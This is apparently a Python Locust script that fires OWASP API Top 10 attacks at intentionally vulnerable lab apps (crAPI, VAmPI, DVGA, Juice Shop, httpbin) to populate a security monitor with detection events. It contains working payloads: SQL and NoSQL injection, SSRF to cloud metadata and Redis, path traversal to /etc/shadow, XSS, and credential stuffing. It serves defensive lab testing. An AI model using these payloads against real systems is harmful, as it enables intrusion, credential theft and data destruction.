"""OWASP API Security Top 10 (2023) attack traffic generator.

Companion to scripts/traffic/locustfile.py — the locustfile generates a clean
behavioural baseline; this file fires runtime attacks across all five
vulnerable apps via their gateways so Noname's Runtime tab populates with
detection events.

Coverage map (best-effort, not exhaustive):

  API1 - Broken Object Level Authorization (BOLA)
  API2 - Broken Authentication
  API3 - Broken Object Property Level Authorization (BOPLA / mass assignment)
  API4 - Unrestricted Resource Consumption
  API5 - Broken Function Level Authorization (BFLA)
  API6 - Unrestricted Access to Sensitive Business Flows
  API7 - Server-Side Request Forgery (SSRF)
  API8 - Security Misconfiguration
  API9 - Improper Inventory Management

Run AFTER `make traffic` has been running for ~30 minutes so Noname has a
behavioural baseline; the attacks then show up as anomalies rather than
seeded normal traffic.
"""

import os
import sys
import random
import secrets

from locust import FastHttpUser, between, task

KONG_ALB_DNS = os.environ.get("KONG_ALB_DNS")
NGINX_ALB_DNS = os.environ.get("NGINX_ALB_DNS")
MULE_ALB_DNS = os.environ.get("MULE_ALB_DNS")
if not KONG_ALB_DNS or not NGINX_ALB_DNS:
    sys.exit("ERROR: KONG_ALB_DNS and NGINX_ALB_DNS must be set. Run via 'make traffic-owasp'.")

KONG_BASE = f"http://{KONG_ALB_DNS}"
NGINX_BASE = f"http://{NGINX_ALB_DNS}"
MULE_BASE = f"http://{MULE_ALB_DNS}" if MULE_ALB_DNS else None

# Attacks deliberately produce 4xx/5xx — we don't want locust treating those
# as failures and polluting the stats. This tuple covers everything from
# "auth rejected" (401/403) through "input rejected" (400/422) to "server
# blew up" (500/502/503). Only network errors should count as failures.
ATTACK_OK = (200, 201, 204, 301, 302, 303, 304, 400, 401, 403, 404, 405,
             406, 409, 410, 413, 414, 415, 422, 429, 500, 501, 502, 503, 504)

# Common-password lists for credential stuffing — small lists are deliberate;
# real brute force uses huge dicts but lab demos just need recognisable
# patterns Noname can pick up as repeated-failed-auth-from-one-source.
COMMON_PASSWORDS = (
    "admin", "password", "Password1!", "letmein", "qwerty", "123456",
    "welcome", "P@ssw0rd", "changeme", "root",
)
COMMON_USERNAMES = ("admin", "administrator", "root", "user", "test", "guest", "support")

# SQL/NoSQL injection probes — distinctive payloads Noname's pattern detector
# is good at flagging.
SQLI_PAYLOADS = (
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' --",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; DROP TABLE users--",
    "' OR '' = '",
)
NOSQLI_PAYLOADS = (
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
)

# Internal/SSRF targets — RFC 1918, link-local metadata, common service ports.
SSRF_TARGETS = (
    "http://169.254.169.254/latest/meta-data/",         # AWS instance metadata
    "http://localhost:8001/status",                     # Kong Admin API
    "http://127.0.0.1:9/",                              # discard port — connection refused immediately
    "http://127.0.0.1:22",                              # SSH
    "file:///etc/passwd",                               # local file scheme
    "gopher://localhost:6379/_FLUSHALL",                # Redis via gopher
)

PATH_TRAVERSAL = (
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/shadow",
)


def uid():
    return secrets.token_hex(4)


def gql(query):
    return {"query": query}


# ─── crAPI — multi-service OWASP target via Kong /crapi/ ─────────────────────


class CrAPIAttacker(FastHttpUser):
    """Hits crAPI through Kong with auth, BOLA, BFLA, mass-assignment, SSRF."""

    host = KONG_BASE
    weight = 2
    wait_time = between(0.5, 2)
    network_timeout = 20.0
    connection_timeout = 20.0

    def on_start(self):
        # Register a low-privilege user — we'll use this token to attempt
        # privileged actions and access other users' data.
        self.email = f"attacker_{uid()}@lab.test"
        self.password = "LabPass123!"
        self.auth = {}
        with self.client.post("/crapi/identity/api/auth/signup", json={
            "name": "Lab Attacker",
            "email": self.email,
            "number": str(random.randint(5550000000, 5559999999)),
            "password": self.password,
        }, catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()
        with self.client.post("/crapi/identity/api/auth/login", json={
            "email": self.email, "password": self.password,
        }, catch_response=True) as r:
            if r.status_code == 200:
                token = r.json().get("token")
                if token:
                    self.auth = {"Authorization": f"Bearer {token}"}
            if r.status_code in ATTACK_OK:
                r.success()

    @task(4)
    def api1_bola_other_user_profile(self):
        # API1: walk other user IDs sequentially — Noname loves this pattern.
        target = random.randint(1, 200)
        with self.client.get(f"/crapi/identity/api/v2/user/profile/{target}",
                             name="/crapi/identity/api/v2/user/profile/{id}",
                             headers=self.auth, catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(4)
    def api1_bola_other_user_orders(self):
        order_id = random.randint(1, 500)
        with self.client.get(f"/crapi/workshop/api/shop/orders/{order_id}",
                             name="/crapi/workshop/api/shop/orders/{id}",
                             headers=self.auth, catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(3)
    def api2_credential_stuffing(self):
        # API2: brute-force login from a single source — should trip
        # rate-of-failed-auth detection.
        with self.client.post("/crapi/identity/api/auth/login",
                              json={"email": f"{random.choice(COMMON_USERNAMES)}@example.com",
                                    "password": random.choice(COMMON_PASSWORDS)},
                              name="/crapi/identity/api/auth/login [stuffing]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api3_mass_assignment_signup(self):
        # API3: signup with extra "admin" / "role" properties hoping the
        # backend doesn't filter unknown fields.
        with self.client.post("/crapi/identity/api/auth/signup",
                              json={
                                  "name": f"Privesc {uid()}",
                                  "email": f"priv_{uid()}@lab.test",
                                  "number": "5551234567",
                                  "password": "LabPass123!",
                                  "role": "admin",
                                  "isAdmin": True,
                                  "is_admin": True,
                                  "admin": True,
                              },
                              name="/crapi/identity/api/auth/signup [mass-assignment]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api5_bfla_admin_endpoint(self):
        # API5: regular user trying to hit admin-only endpoints.
        with self.client.get("/crapi/workshop/api/management/users/all",
                             headers=self.auth, catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api7_ssrf_mechanic(self):
        # API7: crAPI's contact_mechanic flow takes a callback URL —
        # classic SSRF target.
        with self.client.post("/crapi/workshop/api/merchant/contact_mechanic",
                              headers=self.auth,
                              json={
                                  "mechanic_code": "MECH001",
                                  "problem_details": "test",
                                  "vin": "1HGBH41JXMN109186",
                                  "mileage": 100,
                                  "repeat_request_if_failed": True,
                                  "number_of_repeats": 1,
                                  "mechanic_api": random.choice(SSRF_TARGETS),
                              },
                              name="/crapi/workshop/api/merchant/contact_mechanic [ssrf]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(1)
    def api9_inventory_old_version(self):
        # API9: probe an older API version that may expose more.
        with self.client.get("/crapi/identity/api/v1/user/dashboard",
                             headers=self.auth, catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()


# ─── VAmPI — auth abuse and BOLA via NGINX /vampi/ ───────────────────────────


class VAmPIAttacker(FastHttpUser):
    """SQL injection, debug endpoint exposure, and BOLA on VAmPI."""

    host = NGINX_BASE
    weight = 2
    wait_time = between(0.5, 2)
    network_timeout = 20.0
    connection_timeout = 20.0

    @task(4)
    def api2_sqli_login(self):
        with self.client.post("/vampi/users/v1/login",
                              json={"username": "admin",
                                    "password": random.choice(SQLI_PAYLOADS)},
                              name="/vampi/users/v1/login [sqli]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(4)
    def api2_credential_stuffing(self):
        with self.client.post("/vampi/users/v1/login",
                              json={"username": random.choice(COMMON_USERNAMES),
                                    "password": random.choice(COMMON_PASSWORDS)},
                              name="/vampi/users/v1/login [stuffing]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(3)
    def api1_bola_other_user(self):
        target = random.choice(("admin", "name1", "name2", f"user{random.randint(1, 200)}"))
        with self.client.get(f"/vampi/users/v1/{target}",
                             name="/vampi/users/v1/{username}",
                             catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(3)
    def api5_bfla_debug(self):
        # API5: VAmPI exposes /users/v1/_debug as a deliberate vuln.
        with self.client.get("/vampi/users/v1/_debug",
                             catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api3_mass_assignment_register(self):
        with self.client.post("/vampi/users/v1/register",
                              json={
                                  "username": f"priv_{uid()}",
                                  "password": "LabPass123!",
                                  "email": f"priv_{uid()}@lab.test",
                                  "admin": True,
                              },
                              name="/vampi/users/v1/register [mass-assignment]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()


# ─── DVGA — GraphQL-specific attacks via NGINX /dvga/ ────────────────────────


class DVGAAttacker(FastHttpUser):
    """GraphQL recon, DoS via deep nesting, batch attacks, info disclosure."""

    host = NGINX_BASE
    weight = 1
    wait_time = between(1, 3)

    @task(3)
    def api8_introspection(self):
        # API8: full schema introspection — recon signal.
        q = "{ __schema { types { name fields { name type { name kind } } } } }"
        with self.client.post("/dvga/graphql", json=gql(q),
                              name="/dvga/graphql [introspection]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api4_deep_nesting_dos(self):
        # API4: recursive query — starves the resolver. Lab DVGA may not
        # actually have these relations but the query shape is what matters.
        q = ("{ pastes { owner { paste { owner { paste { owner { paste "
             "{ title } } } } } } } }")
        with self.client.post("/dvga/graphql", json=gql(q),
                              name="/dvga/graphql [deep-nesting]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api2_batch_login(self):
        # API2: batch 100 login mutations in one request — credential
        # stuffing while bypassing rate limits.
        body = [
            gql(f'mutation {{ login(username:"admin", password:"{p}") {{ accessToken }} }}')
            for p in COMMON_PASSWORDS * 10
        ]
        with self.client.post("/dvga/graphql", json=body,
                              name="/dvga/graphql [batch-stuffing]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api3_create_paste_with_owner(self):
        # API3: try to set the paste's owner_id to someone else.
        q = ('mutation { createPaste('
             f'title:"x", content:"{uid()}", public:true, ownerId:1) '
             '{ paste { id title owner { name } } } }')
        with self.client.post("/dvga/graphql", json=gql(q),
                              name="/dvga/graphql [bopla-owner-id]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api1_bola_other_paste(self):
        # API1: enumerate paste IDs — Noname watches for sequential ID walks.
        pid = random.randint(1, 1000)
        q = f'{{ paste(id:{pid}) {{ id title content owner {{ name }} }} }}'
        with self.client.post("/dvga/graphql", json=gql(q),
                              name="/dvga/graphql [paste-id-walk]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()


# ─── Juice Shop — full OWASP catalogue via Mulesoft Flex Gateway ─────────────


class JuiceShopAttacker(FastHttpUser):
    """SQL injection, BOLA, mass assignment, BFLA, XSS, path traversal."""

    abstract = True
    weight = 3
    wait_time = between(0.5, 2)

    @task(5)
    def api2_sqli_login(self):
        # The classic Juice Shop SQLi.
        with self.client.post("/shop/rest/user/login",
                              json={"email": "' OR 1=1--",
                                    "password": "anything"},
                              name="/shop/rest/user/login [sqli]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(3)
    def api2_credential_stuffing(self):
        with self.client.post("/shop/rest/user/login",
                              json={"email": f"{random.choice(COMMON_USERNAMES)}@juice-sh.op",
                                    "password": random.choice(COMMON_PASSWORDS)},
                              name="/shop/rest/user/login [stuffing]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(4)
    def api1_bola_other_user(self):
        target = random.randint(1, 100)
        with self.client.get(f"/shop/api/Users/{target}",
                             name="/shop/api/Users/{id}",
                             catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(4)
    def api1_bola_other_basket(self):
        target = random.randint(1, 50)
        with self.client.get(f"/shop/rest/basket/{target}",
                             name="/shop/rest/basket/{id} [bola]",
                             catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(3)
    def api3_mass_assignment_register(self):
        # API3: try to register as admin.
        with self.client.post("/shop/api/Users",
                              json={
                                  "email": f"priv_{uid()}@juice-sh.op",
                                  "password": "P@ssw0rd1!",
                                  "passwordRepeat": "P@ssw0rd1!",
                                  "role": "admin",
                                  "isAdmin": True,
                                  "deluxeToken": "x",
                                  "totpSecret": "x",
                              },
                              name="/shop/api/Users [mass-assignment]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api5_bfla_admin_users(self):
        with self.client.get("/shop/rest/user/authentication-details",
                             catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api5_bfla_admin_section(self):
        with self.client.get("/shop/api/Quantitys",
                             name="/shop/api/Quantitys [bfla]",
                             catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api7_ssrf_image_url(self):
        # API7: profileImage feature accepts a URL — classic SSRF target.
        with self.client.post("/shop/profile/image/url",
                              data={"imageUrl": random.choice(SSRF_TARGETS)},
                              name="/shop/profile/image/url [ssrf]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api8_misconfig_api_docs(self):
        # API8: /api-docs commonly leaked.
        for path in ("/shop/api-docs", "/shop/rest/admin/application-version"):
            with self.client.get(path, name=f"{path} [recon]",
                                 catch_response=True) as r:
                if r.status_code in ATTACK_OK:
                    r.success()

    @task(2)
    def api9_path_traversal(self):
        # API9 in spirit — exposing files outside the API tree.
        for tail in PATH_TRAVERSAL:
            with self.client.get(f"/shop/ftp/{tail}",
                                 name="/shop/ftp/{traversal}",
                                 catch_response=True) as r:
                if r.status_code in ATTACK_OK:
                    r.success()

    @task(2)
    def api3_xss_feedback(self):
        # XSS payload in a feedback comment — content-based detection.
        payload = f'<script>alert(document.cookie+"{uid()}")</script>'
        with self.client.post("/shop/api/Feedbacks",
                              json={
                                  "comment": payload,
                                  "rating": 5,
                                  "captchaId": 1,
                                  "captcha": "wrong",
                              },
                              name="/shop/api/Feedbacks [xss]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()


if MULE_BASE:
    class _JuiceShopAttacker(JuiceShopAttacker):
        abstract = False
        host = MULE_BASE


# ─── pixi (go-httpbin) — payload abuse and method bypass via Kong /pixi/ ─────


class PixiAttacker(FastHttpUser):
    """Resource consumption, header injection, and method bypass via httpbin."""

    host = KONG_BASE
    weight = 1
    wait_time = between(1, 3)
    network_timeout = 15.0   # pixi/delay/10 takes 10 s by design
    connection_timeout = 15.0

    @task(3)
    def api4_oversized_payload(self):
        # API4: send a 256 KB body to /post. httpbin echoes it back; if the
        # gateway has no body limit this proves the path is exploitable.
        big = "A" * (256 * 1024)
        with self.client.post("/pixi/post", data=big,
                              headers={"Content-Type": "text/plain"},
                              name="/pixi/post [oversized]",
                              catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api4_slow_response(self):
        # API4 again: tie up a worker for several seconds.
        with self.client.get("/pixi/delay/10",
                             name="/pixi/delay/{n} [slowloris-ish]",
                             catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(3)
    def api8_method_bypass(self):
        # API8: try non-standard methods on a read-only path. httpbin echoes
        # the method back; gateway should be the one enforcing.
        method = random.choice(("TRACE", "OPTIONS", "DELETE", "PATCH"))
        with self.client.request(method, "/pixi/anything/admin",
                                 name="/pixi/anything/admin [method-bypass]",
                                 catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()

    @task(2)
    def api8_header_injection(self):
        # Smuggle attacker-controlled headers; /pixi/headers reflects them so
        # we can verify what the gateway forwards vs strips.
        with self.client.get("/pixi/headers",
                             headers={
                                 "X-Forwarded-For": "127.0.0.1, 10.0.0.1' OR 1=1--",
                                 "X-Original-URL": "/admin",
                                 "X-Rewrite-URL": "/admin",
                             },
                             name="/pixi/headers [smuggle]",
                             catch_response=True) as r:
            if r.status_code in ATTACK_OK:
                r.success()
